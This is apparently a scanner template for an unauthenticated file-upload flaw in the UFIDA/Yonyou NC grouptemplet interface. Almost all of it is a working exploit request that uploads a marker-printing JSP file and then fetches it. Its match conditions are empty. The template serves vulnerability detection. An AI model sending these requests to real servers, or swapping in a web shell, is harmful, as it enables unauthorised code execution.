id: yonyou-nc-grouptemplet-fileupload
brief:
    title: UFIDA NC Grouptemplet Interface - Unauthenticated File Upload
    by: SleepingBag945
    level: critical
    about: The UFIDA NC Grouptemplet Interface permits unauthenticated users to upload potentially malicious files.
    label:
        - yonyou
        - intrusive
        - ufida
        - fileupload
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/uapim/upload/grouptemplet?groupid={{v1}}&fileType=jsp'
      head:
        Content-type: multipart/form-data; boundary=----------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7
      body: |-
        ------------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7
        Content-Disposition: form-data; name="upload"; filename="{{randstr_1}}.jsp"
        Content-Type: application/octet-stream

        <%out.println("{{randstr_2}}");%>
        ------------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7--
      signs: []
    - verb: GET
      to:
        - '{{BaseURL}}/uapim/static/pages/{{v1}}/head.jsp'
      signs: []
